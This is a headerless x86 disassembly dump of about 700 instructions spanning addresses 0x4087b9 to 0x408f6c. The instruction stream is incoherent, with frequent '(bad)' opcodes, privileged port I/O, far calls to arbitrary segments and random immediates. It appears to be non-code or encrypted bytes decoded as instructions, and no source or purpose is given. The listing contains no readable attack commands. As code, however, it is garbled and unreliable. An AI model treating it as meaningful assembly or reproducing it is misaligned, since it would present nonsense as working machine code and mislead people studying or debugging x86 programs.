  4087b9:	cmp    BYTE PTR [edi+0x65],bl
  4087bc:	test   eax,0xe2f46e
  4087c1:	mov    bh,dl
  4087c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4087c4:	inc    edi
  4087c5:	fild   DWORD PTR ss:[eax+0x25]
  4087c9:	aaa    
  4087ca:	call   0x935c:0xffb706df
  4087d1:	mov    edx,0x36b0210b
  4087d6:	jge    0x408809
  4087d8:	mov    eax,ds:0xa256a254
  4087dd:	daa    
  4087de:	lods   al,BYTE PTR ds:[esi]
  4087df:	cs dec esp
  4087e1:	adc    DWORD PTR [eax],ecx
  4087e3:	inc    esp
  4087e4:	inc    esi
  4087e5:	ds add al,0xf4
  4087e8:	aaa    
  4087e9:	leave  
  4087ea:	inc    ebp
  4087eb:	mov    ah,0xdb
  4087ed:	mov    ecx,esi
  4087ef:	inc    ebx
  4087f0:	sti    
  4087f1:	in     al,0x4
  4087f3:	neg    BYTE PTR [edi-0x1521d334]
  4087f9:	and    DWORD PTR [eax+0x43afe189],edx
  4087ff:	in     al,0xd7
  408801:	dec    edx
  408802:	hlt    
  408803:	sbb    eax,0xe24e94ef
  408808:	pop    edi
  408809:	iret   
  40880a:	pop    ebp
  40880b:	push   ds
  40880c:	mov    al,0x8
  40880e:	mov    DWORD PTR [ebx],ebp
  408810:	push   eax
  408811:	aad    0x18
  408813:	pop    ecx
  408814:	les    esp,FWORD PTR [edi-0x2c08850c]
  40881a:	cmp    al,0x15
  40881c:	sbb    eax,0x9f432367
  408821:	dec    ebx
  408822:	sbb    dh,BYTE PTR [esi+ecx*8-0x4f]
  408826:	add    al,0xe9
  408828:	mov    ah,BYTE PTR [eax]
  40882a:	xor    eax,0xc8446cc8
  40882f:	or     DWORD PTR [edi+0x49],ecx
  408832:	fdivr  st(0),st
  408834:	outs   dx,DWORD PTR ds:[esi]
  408835:	in     al,dx
  408836:	not    BYTE PTR [ecx+ebp*2+0x68]
  40883a:	fsub   st(7),st
  40883c:	adc    al,0xde
  40883e:	mov    DWORD PTR [eax-0x5a1cd455],eax
  408844:	cmp    ebx,DWORD PTR [ebp-0x1b]
  408847:	aam    0xc6
  408849:	and    al,ah
  40884b:	jb     0x408828
  40884d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40884e:	mov    ah,0xb1
  408850:	shl    DWORD PTR [edi-0x1],1
  408853:	xchg   ebp,eax
  408854:	xchg   ebp,eax
  408855:	mov    ds:0x9f0b48d,al
  40885a:	xchg   edi,eax
  40885b:	or     DWORD PTR [ebp+0x3e],edx
  40885e:	mov    cl,0xd3
  408860:	xor    al,0xf3
  408862:	cmp    bl,0x43
  408865:	mov    al,ds:0xc0cb0997
  40886a:	int    0xf6
  40886c:	add    DWORD PTR [ebp+eiz*1+0x7c],esi
  408870:	jbe    0x4088b4
  408872:	out    dx,al
  408873:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408874:	add    eax,0xe584adb5
  408879:	je     0x40880c
  40887b:	ins    BYTE PTR es:[edi],dx
  40887c:	mov    esi,0x9a05e67b
  408881:	loopne 0x4088b1
  408883:	jmp    0x4154:0x954a5805
  40888a:	inc    ecx
  40888b:	sbb    DWORD PTR [edi+edx*1+0x2a2e07ff],ebx
  408892:	and    cl,BYTE PTR [ecx+ecx*2+0x71]
  408896:	push   DWORD PTR [ecx-0xb1f02cd]
  40889c:	sbb    BYTE PTR [ecx-0x18],ah
  40889f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4088a0:	xor    DWORD PTR ds:[esi],ecx
  4088a3:	retf   0x9bc3
  4088a6:	shr    bh,cl
  4088a8:	sar    eax,1
  4088aa:	mov    ss,WORD PTR [esp+ecx*8]
  4088ad:	inc    edx
  4088ae:	push   ebx
  4088af:	push   es
  4088b0:	(bad)  
  4088b1:	hlt    
  4088b2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4088b3:	loop   0x408899
  4088b5:	or     eax,0xf67e78c1
  4088ba:	inc    ebp
  4088bb:	stc    
  4088bc:	push   ebx
  4088bd:	mov    eax,0x6f2e8bc3
  4088c2:	or     eax,0xc9836ab5
  4088c7:	or     al,BYTE PTR ds:0xe5e545bf
  4088cd:	jo     0x40889a
  4088cf:	fwait
  4088d0:	xlat   BYTE PTR ds:[ebx]
  4088d1:	or     DWORD PTR [ecx],ebp
  4088d3:	inc    ebp
  4088d4:	adc    edi,eax
  4088d6:	repnz xlat BYTE PTR ds:[ebx]
  4088d8:	or     eax,0x5aa35352
  4088dd:	xchg   esp,eax
  4088de:	das    
  4088df:	in     al,dx
  4088e0:	inc    esp
  4088e1:	(bad)  
  4088e3:	cmp    al,0xd7
  4088e5:	lods   eax,DWORD PTR ds:[esi]
  4088e6:	xlat   BYTE PTR ds:[ebx]
  4088e7:	ja     0x4088b5
  4088e9:	jg     0x40896a
  4088eb:	je     0x40891c
  4088ed:	mov    ds:0xead2659e,al
  4088f2:	inc    esp
  4088f3:	pop    ebp
  4088f4:	jl     0x4088c0
  4088f6:	cmc    
  4088f7:	cmp    al,0xe1
  4088f9:	mov    ebp,DWORD PTR [edi-0xf]
  4088fc:	and    ah,BYTE PTR [esp+ebx*8+0x7ae2ba44]
  408903:	pop    ebp
  408904:	mov    esi,0x349043b3
  408909:	cmp    al,BYTE PTR [ecx+edi*8+0x61]
  40890d:	adc    DWORD PTR [ebp+0x29],esi
  408910:	adc    eax,0xb5c241f7
  408915:	bnd jmp 0x4088cf
  408918:	loopne 0x4088d7
  40891a:	xchg   edi,eax
  40891b:	call   0xb3b82d4e
  408920:	or     eax,0xb0c0fdb5
  408925:	ja     0x4088c2
  408927:	cwde   
  408928:	and    edi,esp
  40892a:	or     eax,0xdf690303
  40892f:	push   edx
  408930:	enter  0xfcb6,0x4d
  408934:	jnp    0x408993
  408936:	pop    ds
  408937:	inc    esp
  408938:	sub    ch,BYTE PTR [esi-0x3f]
  40893b:	aas    
  40893c:	mov    bh,0xbd
  40893e:	daa    
  40893f:	sbb    DWORD PTR [ebp+0x3c],ebp
  408942:	sub    DWORD PTR [ebx],edx
  408944:	jg     0x40890e
  408946:	fimul  DWORD PTR [esi-0x3a]
  408949:	fs and al,0x9a
  40894c:	int    0xb7
  40894e:	push   cs
  40894f:	inc    ecx
  408950:	adc    cl,0xe8
  408953:	mov    edi,0xccf02eab
  408958:	dec    edx
  408959:	adc    al,0x1d
  40895b:	imul   ebp,DWORD PTR [ecx],0x4f358f93
  408961:	pop    edx
  408962:	add    eax,0x393fc6b4
  408967:	xchg   edx,eax
  408968:	iret   
  408969:	outs   dx,BYTE PTR ds:[esi]
  40896a:	inc    ebp
  40896b:	add    edi,ebp
  40896d:	cs aam 0xa3
  408970:	dec    eax
  408971:	in     al,dx
  408972:	into   
  408973:	int    0x98
  408975:	stc    
  408976:	cmc    
  408977:	pop    esi
  408978:	push   es
  408979:	push   eax
  40897a:	mov    dh,ah
  40897c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40897d:	inc    eax
  40897e:	retf   0xfc51
  408981:	mov    bh,BYTE PTR [ecx-0x65]
  408984:	mov    ebx,ebp
  408986:	xor    al,0x30
  408988:	jno    0x4089a5
  40898a:	outs   dx,DWORD PTR ds:[esi]
  40898b:	or     bh,BYTE PTR [ebx]
  40898d:	rcr    BYTE PTR [esi+eiz*1+0x493ebd68],0xa0
  408995:	lea    ebx,[esp+eax*1]
  408998:	push   edx
  408999:	cmp    BYTE PTR ds:0x494b3413,0xf0
  4089a0:	retf   
  4089a1:	(bad)  
  4089a3:	push   es
  4089a4:	mov    dh,0x31
  4089a6:	ret    
  4089a7:	cmp    eax,0x41c59193
  4089ac:	cmp    bh,BYTE PTR [ebx]
  4089ae:	leave  
  4089af:	(bad)  
  4089b0:	and    DWORD PTR [eax-0x749bb263],ebp
  4089b6:	imul   ecx,edx,0x1b
  4089b9:	adc    al,0x20
  4089bb:	pop    esi
  4089bc:	sub    al,0xe2
  4089be:	sub    edi,esi
  4089c0:	push   ss
  4089c1:	sub    ebp,DWORD PTR [eax+0x4f1366b0]
  4089c7:	outs   dx,DWORD PTR ds:[esi]
  4089c8:	or     ecx,DWORD PTR [esi]
  4089ca:	and    eax,DWORD PTR ds:0x309e0904
  4089d0:	cs jmp 0x1410a3ac
  4089d6:	mov    dl,0x3a
  4089d8:	dec    edi
  4089d9:	retf   0x2977
  4089dc:	dec    eax
  4089dd:	adc    BYTE PTR [esi+0x2f],al
  4089e0:	xchg   ecx,eax
  4089e1:	or     BYTE PTR [ecx*2-0x755f4d08],ah
  4089e8:	nop
  4089e9:	dec    ecx
  4089ea:	icebp  
  4089eb:	jg     0x4089ed
  4089ed:	loope  0x4089dc
  4089ef:	sub    ebp,DWORD PTR [ecx]
  4089f1:	mov    dl,0x72
  4089f3:	test   BYTE PTR [ecx-0x623ffea0],ah
  4089f9:	cs scas eax,DWORD PTR es:[edi]
  4089fb:	daa    
  4089fc:	cmp    bh,BYTE PTR [edi+0x2a]
  4089ff:	fisub  DWORD PTR [ebp-0x2a1841db]
  408a05:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408a06:	adc    eax,DWORD PTR [eax-0x3851aab8]
  408a0c:	sbb    eax,0x7e80dff3
  408a11:	cwde   
  408a12:	cmp    eax,0x59058a26
  408a17:	cmp    al,0x3a
  408a19:	xchg   BYTE PTR [ebp+0x16],ch
  408a1c:	jno    0x408a2d
  408a1e:	add    eax,0xe294540e
  408a23:	jns    0x408a5d
  408a25:	aad    0xb9
  408a27:	cld    
  408a28:	nop
  408a29:	sbb    ebx,DWORD PTR [ecx+ebx*8+0x70]
  408a2d:	add    DWORD PTR [edx-0x4997f85b],edx
  408a33:	sbb    al,0x7c
  408a35:	idiv   DWORD PTR [ebp+0x3e7ae000]
  408a3b:	scas   eax,DWORD PTR es:[edi]
  408a3c:	mov    edi,edi
  408a3e:	enter  0x6e0f,0x22
  408a42:	jne    0x408a9a
  408a44:	les    ebp,FWORD PTR [eax-0x61]
  408a47:	mov    dl,0x33
  408a49:	arpl   WORD PTR [ebp+eax*4+0x13],di
  408a4d:	scas   al,BYTE PTR es:[edi]
  408a4e:	adc    BYTE PTR [ecx-0x6ae5a61b],bl
  408a54:	or     DWORD PTR [ebx-0x59e8eb15],ebp
  408a5a:	dec    edi
  408a5b:	or     DWORD PTR [edi+0x1f],0x4a3a6a3b
  408a62:	ret    0xbacb
  408a65:	or     BYTE PTR [ebp-0x106ceeff],bl
  408a6b:	mov    al,0xf3
  408a6d:	lock sbb al,0x14
  408a70:	(bad)  
  408a71:	sub    eax,0xdac0e919
  408a76:	xchg   ebx,eax
  408a77:	xor    bh,BYTE PTR gs:[ecx-0x6e787b79]
  408a7e:	inc    ebx
  408a7f:	lahf   
  408a80:	pop    ebp
  408a81:	dec    ebx
  408a82:	pop    ds
  408a83:	call   0xc969:0x9ba24d98
  408a8a:	popf   
  408a8b:	retf   0x46c9
  408a8e:	mov    ebp,0x6719ea8e
  408a93:	inc    edi
  408a94:	inc    ebp
  408a95:	cmp    al,0x8
  408a97:	outs   dx,BYTE PTR ds:[esi]
  408a98:	test   BYTE PTR [esi+0x53],ah
  408a9b:	jo     0x408ab5
  408a9d:	inc    esp
  408a9e:	or     BYTE PTR [eax-0xff488a3],ah
  408aa4:	sub    al,0xc3
  408aa6:	mov    eax,0x73c1caef
  408aab:	xchg   edx,eax
  408aac:	push   ebx
  408aad:	jo     0x408b06
  408aaf:	loope  0x408ad5
  408ab1:	mov    dl,0x41
  408ab3:	xchg   BYTE PTR [edi-0x4c8ae5e4],dl
  408ab9:	mov    WORD PTR [ebx-0x54ac263a],ss
  408abf:	aas    
  408ac0:	outs   dx,BYTE PTR ds:[esi]
  408ac1:	mov    eax,0x5b1bdadc
  408ac6:	sbb    al,0x7b
  408ac8:	sbb    ah,BYTE PTR [eax]
  408aca:	pop    ss
  408acb:	pop    ebp
  408acc:	mov    ecx,0xd77c7284
  408ad1:	pop    esi
  408ad2:	fwait
  408ad3:	lahf   
  408ad4:	sti    
  408ad5:	jne    0x408ae2
  408ad7:	(bad)  
  408ad8:	leave  
  408ad9:	ret    0xec2c
  408adc:	cdq    
  408add:	mov    ah,0x13
  408adf:	inc    esi
  408ae0:	jb     0x408aa9
  408ae2:	pop    ss
  408ae3:	jne    0x408b4a
  408ae5:	repz inc ebx
  408ae7:	rcl    dh,cl
  408ae9:	and    al,0x9f
  408aeb:	jno    0x408b67
  408aed:	push   ebx
  408aee:	in     eax,dx
  408aef:	pushf  
  408af0:	pop    es
  408af1:	mov    bl,0x50
  408af3:	arpl   WORD PTR [edi-0x588d915a],bx
  408af9:	push   edx
  408afa:	pop    ebp
  408afb:	leave  
  408afc:	test   al,0xe0
  408afe:	jmp    0x408b69
  408b00:	adc    al,0x5d
  408b02:	inc    edx
  408b03:	(bad)  
  408b04:	and    eax,0x4f292d2b
  408b09:	dec    ebp
  408b0a:	or     edi,ecx
  408b0c:	cwde   
  408b0d:	sahf   
  408b0e:	dec    ecx
  408b0f:	jg     0x408b61
  408b11:	mov    ds:0x27b41e45,eax
  408b16:	xor    DWORD PTR [ebp+0x1a],esi
  408b19:	push   ds
  408b1a:	mov    edx,DWORD PTR [edi+edi*4+0x71618cf6]
  408b21:	push   edx
  408b22:	pop    ebp
  408b23:	mov    ebp,0xde7e7cf0
  408b28:	mov    ah,0xea
  408b2a:	sub    al,0x5b
  408b2c:	add    DWORD PTR [eax],ecx
  408b2e:	or     edx,edi
  408b30:	pusha  
  408b31:	push   ebp
  408b32:	jge    0x408b99
  408b34:	out    dx,eax
  408b35:	jecxz  0x408b0a
  408b37:	cmp    DWORD PTR [ebp-0x3f],esp
  408b3a:	hlt    
  408b3b:	ficom  DWORD PTR [eax+0x41]
  408b3e:	pop    ecx
  408b3f:	cli    
  408b40:	mov    ch,al
  408b42:	in     al,dx
  408b43:	dec    edi
  408b44:	dec    ebx
  408b45:	stos   BYTE PTR es:[edi],al
  408b46:	and    edx,DWORD PTR [edi-0x7666d447]
  408b4c:	and    BYTE PTR [eax],al
  408b4e:	pop    es
  408b4f:	(bad)  
  408b50:	mov    esi,0x17fa40d4
  408b55:	imul   edi,DWORD PTR [eax+0x2b664afd],0x5c11eff7
  408b5f:	out    0xc8,eax
  408b61:	ret    0xcfc1
  408b64:	ins    DWORD PTR es:[edi],dx
  408b65:	dec    esi
  408b66:	js     0x408b26
  408b68:	pop    ss
  408b69:	jbe    0x408af3
  408b6b:	into   
  408b6c:	(bad)  
  408b6d:	(bad)  
  408b6f:	push   ss
  408b70:	xchg   DWORD PTR [esi+0x6c7f545a],ebx
  408b76:	mov    bl,0xaa
  408b78:	and    BYTE PTR [edx-0x5f],0x4a
  408b7c:	cs sahf 
  408b7e:	aaa    
  408b7f:	adc    eax,0x247730ac
  408b84:	jecxz  0x408bcf
  408b86:	mov    bh,0xb7
  408b88:	sbb    esi,DWORD PTR [ecx]
  408b8a:	shl    DWORD PTR [esi+0x287601c9],0x5f
  408b91:	adc    al,0x58
  408b93:	mov    BYTE PTR [esi],cl
  408b95:	aas    
  408b96:	jmp    0x408b62
  408b98:	sbb    al,0x99
  408b9a:	sbb    al,BYTE PTR [edi-0x6eaf0752]
  408ba0:	fstp   QWORD PTR [ecx]
  408ba2:	sbb    al,0x3f
  408ba4:	pop    esi
  408ba5:	repz mov dh,0xed
  408ba8:	stos   BYTE PTR es:[edi],al
  408ba9:	mov    cl,0x15
  408bab:	dec    DWORD PTR [esi]
  408bad:	aad    0x6a
  408baf:	fld    TBYTE PTR [edx+ebx*2+0x35]
  408bb3:	daa    
  408bb4:	jecxz  0x408b5d
  408bb6:	repz xor bh,al
  408bb9:	jbe    0x408c02
  408bbb:	mov    ah,0xe8
  408bbd:	imul   eax,DWORD PTR [eax],0xb
  408bc0:	dec    esp
  408bc1:	xlat   BYTE PTR ds:[ebx]
  408bc2:	cmp    al,0x63
  408bc4:	or     al,BYTE PTR [eax-0x2e4a02ba]
  408bca:	dec    eax
  408bcb:	cmp    eax,0xf0aef236
  408bd0:	pop    ebx
  408bd1:	clc    
  408bd2:	stos   DWORD PTR es:[edi],eax
  408bd3:	add    al,0x6c
  408bd5:	jge    0x408c42
  408bd7:	xor    cl,ah
  408bd9:	sub    eax,0x9f3c9e3c
  408bde:	mov    edi,0xe8b63b3d
  408be3:	inc    esi
  408be4:	pop    ebp
  408be5:	and    bl,cl
  408be7:	push   eax
  408be8:	and    BYTE PTR [esi-0x6d],cl
  408beb:	and    DWORD PTR [ecx],edi
  408bed:	js     0x408be9
  408bef:	mov    esp,0x7971319d
  408bf4:	mov    ebx,0x3703ac67
  408bf9:	call   0x6ca1171c
  408bfe:	test   al,0x7b
  408c00:	or     ebx,DWORD PTR [ebp-0x62]
  408c03:	out    dx,eax
  408c04:	jmp    0x5370:0x43f6781
  408c0b:	sub    ebp,0x24
  408c0e:	dec    esp
  408c0f:	pop    edx
  408c10:	idiv   DWORD PTR [esi-0x519a0760]
  408c16:	push   0xcb71c83f
  408c1b:	leave  
  408c1c:	sti    
  408c1d:	call   0xb4224067
  408c22:	xor    dh,0xa8
  408c25:	dec    edx
  408c26:	das    
  408c27:	fisubr DWORD PTR [edi]
  408c29:	retf   
  408c2a:	test   BYTE PTR [edi+ebx*2],bl
  408c2d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408c2e:	inc    esp
  408c2f:	dec    edi
  408c30:	aas    
  408c31:	aaa    
  408c32:	(bad)
  408c37:	call   0x67d4:0x3aa24100
  408c3e:	push   esp
  408c3f:	cld    
  408c40:	push   edx
  408c41:	or     cl,BYTE PTR ss:[ecx+edi*4]
  408c45:	or     edi,DWORD PTR [eax-0x10bc683d]
  408c4b:	sub    ebp,DWORD PTR [eax-0x208d40d0]
  408c51:	mov    ecx,0xf0af6ba4
  408c56:	pop    ebp
  408c57:	inc    esp
  408c58:	adc    DWORD PTR [esi-0x49],eax
  408c5b:	aaa    
  408c5c:	(bad)  
  408c5d:	shl    BYTE PTR [edx],1
  408c5f:	out    dx,eax
  408c60:	mov    ebp,0xf7fcfcbb
  408c65:	stc    
  408c66:	test   eax,0x621dd3db
  408c6b:	mov    BYTE PTR [edi],dl
  408c6d:	(bad)  
  408c6e:	js     0x408c55
  408c70:	inc    eax
  408c71:	dec    edi
  408c72:	retf   
  408c73:	vpaddw ymm2,ymm1,YMMWORD PTR [esi+edi*8]
  408c78:	inc    ecx
  408c79:	or     DWORD PTR [edi-0x4d],edx
  408c7c:	shl    DWORD PTR [edx+0x16],0x99
  408c80:	fidiv  DWORD PTR [eax-0x1d]
  408c83:	xor    DWORD PTR [esi-0x4f0d089d],0xffffffd0
  408c8a:	mov    ecx,0x4a8e3864
  408c8f:	add    esi,esp
  408c91:	aad    0x9e
  408c93:	xchg   esp,eax
  408c94:	fwait
  408c95:	aas    
  408c96:	add    esi,DWORD PTR [ebx-0x24]
  408c99:	cmp    al,0xc3
  408c9b:	cmp    al,0x49
  408c9d:	mov    eax,ds:0xbfd1b544
  408ca2:	scas   al,BYTE PTR es:[edi]
  408ca3:	scas   al,BYTE PTR es:[edi]
  408ca4:	rcl    BYTE PTR [esi],cl
  408ca6:	sahf   
  408ca7:	repz cmp al,0x7a
  408caa:	pusha  
  408cab:	das    
  408cac:	and    eax,0x787688ae
  408cb1:	test   DWORD PTR [edx+0x6c426817],edi
  408cb7:	mov    dl,0xac
  408cb9:	push   esi
  408cba:	cmc    
  408cbb:	js     0x408cbc
  408cbd:	inc    ebp
  408cbe:	les    ebp,FWORD PTR [edx-0x3d]
  408cc1:	jg     0x408c8b
  408cc3:	mov    ds:0x56c862e0,eax
  408cc8:	int3   
  408cc9:	and    al,0xf6
  408ccb:	mov    ds:0xbe3cc2,eax
  408cd0:	scas   eax,DWORD PTR es:[edi]
  408cd1:	cmp    eax,0x2677a4c
  408cd6:	cld    
  408cd7:	xchg   edx,eax
  408cd8:	cmp    dh,BYTE PTR [edi+edi*8]
  408cdb:	mov    eax,0x5365f0e4
  408ce0:	or     al,0x4a
  408ce2:	pop    eax
  408ce3:	mov    esp,0x6e65e8b1
  408ce8:	call   0xf688:0xd8f688d2
  408cef:	push   cs
  408cf0:	cmp    ebp,ecx
  408cf2:	pushf  
  408cf3:	add    DWORD PTR [ecx-0x5df29646],esp
  408cf9:	jns    0x408cab
  408cfb:	test   BYTE PTR [edx+ecx*1],cl
  408cfe:	call   0x23022217
  408d03:	sbb    DWORD PTR [ebx],esi
  408d05:	mov    esi,0x1a6046eb
  408d0a:	pushf  
  408d0b:	mov    ds:0x9fe0376b,eax
  408d10:	jae    0x408d42
  408d12:	pop    DWORD PTR [ebx+0x3b1e811e]
  408d18:	xor    eax,0x39fdd73a
  408d1d:	lock sbb bl,al
  408d20:	mov    al,ds:0xb56cc442
  408d25:	xchg   BYTE PTR [edi],dh
  408d27:	dec    esi
  408d28:	add    DWORD PTR [ebp-0x55af577c],0xfffffff6
  408d2f:	xor    ebp,ebp
  408d31:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408d32:	ror    BYTE PTR ds:0xbfef1bbe,1
  408d38:	nop
  408d39:	add    ah,BYTE PTR [eax-0x9cdfd3b]
  408d3f:	jmp    FWORD PTR [eax]
  408d41:	sahf   
  408d42:	push   es
  408d43:	adc    eax,0xa5e3bff4
  408d48:	xchg   edx,eax
  408d49:	(bad)  
  408d4a:	xlat   BYTE PTR ds:[ebx]
  408d4b:	pop    es
  408d4c:	push   esp
  408d4d:	test   BYTE PTR [ebp-0x80],0x0
  408d51:	ror    DWORD PTR [esi+0x48],0xa3
  408d55:	aas    
  408d56:	or     DWORD PTR [ebx+0x17],edi
  408d59:	aam    0xf
  408d5b:	repz mov bl,0xdd
  408d5e:	je     0x408d1f
  408d60:	cmp    BYTE PTR [ebp+0x7d41c860],dh
  408d66:	xchg   esp,edi
  408d68:	sub    esp,DWORD PTR [edi]
  408d6a:	jge    0x408cef
  408d6c:	add    ah,BYTE PTR [eax]
  408d6e:	push   es
  408d6f:	imul   edi,DWORD PTR [ebp+esi*8-0x4c1bc20c],0xd1907e74
  408d7a:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  408d7c:	aam    0xa9
  408d7e:	adc    ebp,DWORD PTR ss:[ebx+esi*2+0x659ce5ae]
  408d86:	fst    DWORD PTR [edx]
  408d88:	pop    ebp
  408d89:	pop    ss
  408d8a:	fisub  WORD PTR [ecx+0x41]
  408d8d:	aad    0xaf
  408d8f:	(bad)  
  408d90:	aad    0x19
  408d92:	xchg   DWORD PTR [edx+0x61],esp
  408d95:	and    al,0x38
  408d97:	popf   
  408d98:	fild   QWORD PTR [eax]
  408d9a:	mov    ecx,0x520f113c
  408d9f:	(bad)  
  408da0:	adc    DWORD PTR [ebx+0x18],esi
  408da3:	push   edi
  408da4:	push   ds
  408da5:	mov    esi,0x6609480e
  408daa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408dab:	pushf  
  408dac:	dec    edx
  408dad:	jo     0x408dd7
  408daf:	or     al,BYTE PTR ds:[ebp+edx*8-0x3a919f81]
  408db7:	cmc    
  408db8:	adc    eax,0xd2c6d8e7
  408dbd:	pop    ebx
  408dbe:	jb     0x408d8c
  408dc0:	xchg   edx,eax
  408dc1:	scas   eax,DWORD PTR es:[edi]
  408dc2:	popf   
  408dc3:	ins    BYTE PTR es:[edi],dx
  408dc4:	jno    0x408d66
  408dc6:	add    ecx,DWORD PTR [esp+eax*4+0x461c9257]
  408dcd:	call   0x6a13a6b0
  408dd2:	in     eax,dx
  408dd3:	out    0x8c,eax
  408dd5:	cmc    
  408dd6:	sbb    DWORD PTR [edx+ebx*8],0xffffff93
  408dda:	addr16 mov al,ds:0xc4cc
  408dde:	push   edi
  408ddf:	sar    BYTE PTR [ebx-0x21ba2ca3],0x38
  408de6:	pop    ebp
  408de7:	jb     0x408deb
  408de9:	inc    eax
  408dea:	scas   eax,DWORD PTR es:[edi]
  408deb:	sbb    ebx,esp
  408ded:	xchg   ebx,eax
  408dee:	stos   DWORD PTR es:[edi],eax
  408def:	stos   BYTE PTR es:[edi],al
  408df0:	sbb    BYTE PTR [ebp+0x6c118693],ch
  408df6:	popa   
  408df7:	push   ds
  408df8:	xor    ebp,ebx
  408dfa:	sub    DWORD PTR [esi-0x2efbd40],eax
  408e00:	(bad)  
  408e01:	push   0x0
  408e03:	add    eax,0xd37bfb01
  408e08:	pop    esp
  408e09:	xor    DWORD PTR [eax-0x5d3af104],esp
  408e0f:	or     dh,BYTE PTR [ebx]
  408e11:	add    esi,DWORD PTR [esi]
  408e13:	xor    edx,DWORD PTR [edx+0x5a6e115b]
  408e19:	pop    esi
  408e1a:	mov    ah,0x9a
  408e1c:	(bad)  
  408e1d:	in     eax,dx
  408e1e:	jmp    0x3416a4e6
  408e23:	mov    esp,0xb0809518
  408e28:	pop    ebp
  408e29:	sub    ecx,DWORD PTR [edi+0x73daa3ec]
  408e2f:	repnz arpl WORD PTR [ebx-0x6aedcfbd],di
  408e36:	call   0xd026:0x8fea3bcb
  408e3d:	sti    
  408e3e:	pop    esi
  408e3f:	popa   
  408e40:	test   DWORD PTR [eax+0x1f5e9609],esi
  408e46:	(bad)  
  408e47:	lods   eax,DWORD PTR ds:[esi]
  408e48:	imul   edi,ebx,0x3538d986
  408e4e:	fiadd  WORD PTR [ecx]
  408e50:	cmp    al,BYTE PTR [ecx+esi*8+0x78082399]
  408e57:	aad    0xe3
  408e59:	lock jmp 0x408e56
  408e5c:	jmp    0x408e86
  408e5e:	ins    BYTE PTR es:[edi],dx
  408e5f:	lods   eax,DWORD PTR ds:[esi]
  408e60:	and    eax,0x18de0f5b
  408e65:	pop    ecx
  408e66:	fsubr  DWORD PTR [esi+eax*4+0x264acab3]
  408e6d:	xor    bh,cl
  408e6f:	repz or BYTE PTR ds:0xfebce66b,0xc3
  408e77:	push   ss
  408e78:	scas   eax,DWORD PTR es:[edi]
  408e79:	cmp    cl,BYTE PTR [ecx]
  408e7b:	rol    DWORD PTR [edx-0x48ffd839],0xa8
  408e82:	dec    edi
  408e83:	loop   0x408ec0
  408e85:	push   0x1d3cdc6c
  408e8a:	dec    edi
  408e8b:	ins    BYTE PTR es:[edi],dx
  408e8c:	div    BYTE PTR [eax+eiz*1]
  408e8f:	mov    ah,0x88
  408e91:	outs   dx,DWORD PTR ds:[esi]
  408e92:	ja     0x408e66
  408e94:	fisttp QWORD PTR [ebx]
  408e96:	repnz add DWORD PTR [edx-0x143e3f6d],esi
  408e9d:	add    dh,BYTE PTR [ecx]
  408e9f:	popa   
  408ea0:	cli    
  408ea1:	fcmovnb st,st(7)
  408ea3:	and    dl,cl
  408ea5:	mov    bh,0xf4
  408ea7:	mov    DWORD PTR [ecx+0x7b7af676],ebx
  408ead:	shl    DWORD PTR [ecx-0x9f62ef7],cl
  408eb3:	cmp    ebx,DWORD PTR [ebp+edx*2-0x5e]
  408eb7:	aad    0x41
  408eb9:	fnstsw WORD PTR [edx+0x6cee4e7a]
  408ebf:	rcr    DWORD PTR [eax+0x78822e73],1
  408ec5:	bound  ebp,QWORD PTR [ebp+0x6ce7946a]
  408ecb:	push   edx
  408ecc:	retf   0x6f3b
  408ecf:	in     al,dx
  408ed0:	sbb    eax,0x5d8723c0
  408ed5:	jae    0x408f26
  408ed7:	dec    esi
  408ed8:	hlt    
  408ed9:	popa   
  408eda:	xchg   edx,eax
  408edb:	and    al,0x67
  408edd:	in     eax,0x39
  408edf:	test   al,0x87
  408ee1:	pop    ecx
  408ee2:	add    ebx,eax
  408ee4:	lahf   
  408ee5:	mov    ebp,0xc5f2eb82
  408eea:	push   eax
  408eeb:	fcomi  st,st(2)
  408eed:	or     esp,DWORD PTR [eax]
  408eef:	int3   
  408ef0:	cmp    ebp,DWORD PTR [eax-0x40d067a1]
  408ef6:	pop    ds
  408ef7:	popa   
  408ef8:	sbb    ch,BYTE PTR [esi]
  408efa:	xchg   esp,eax
  408efb:	repz push ebp
  408efd:	sub    esp,DWORD PTR [esi-0x4e]
  408f00:	push   es
  408f01:	cld    
  408f02:	dec    eax
  408f03:	sbb    edx,DWORD PTR [esi]
  408f05:	add    al,0xe0
  408f07:	cwde   
  408f08:	js     0x408ef3
  408f0a:	test   eax,0x39ed90e9
  408f0f:	ror    DWORD PTR [ecx-0x4a],1
  408f12:	sub    eax,0x67ab7d77
  408f17:	inc    esi
  408f18:	aaa    
  408f19:	gs (bad) 
  408f1b:	hlt    
  408f1c:	inc    ebp
  408f1d:	(bad)  
  408f1e:	xor    BYTE PTR [edi-0x56b92a35],ch
  408f24:	push   ebx
  408f25:	into   
  408f26:	or     eax,0xec6da58
  408f2b:	or     eax,0xa7ced664
  408f30:	in     al,dx
  408f31:	lods   al,BYTE PTR ds:[esi]
  408f32:	add    cl,ah
  408f34:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408f35:	(bad)  
  408f36:	frstor [edi+0x62]
  408f39:	out    0x86,eax
  408f3b:	daa    
  408f3c:	pop    eax
  408f3d:	sub    eax,0x3bfd3206
  408f42:	and    dh,BYTE PTR [ebp+0x34ae961b]
  408f48:	mov    dh,0x28
  408f4a:	imul   ebp,esp,0x3d1d465a
  408f50:	pop    ecx
  408f51:	test   al,0x35
  408f53:	adc    al,0x11
  408f55:	mov    esi,0x55726625
  408f5a:	add    DWORD PTR [ebp+0x76],ebx
  408f5d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  408f5e:	ins    BYTE PTR es:[edi],dx
  408f5f:	xchg   edi,eax
  408f60:	cmp    BYTE PTR [edx+0x46b7449],0x6e
  408f67:	cmp    dl,0x17
  408f6a:	hlt    
  408f6b:	retf   
  408f6c:	push   esp
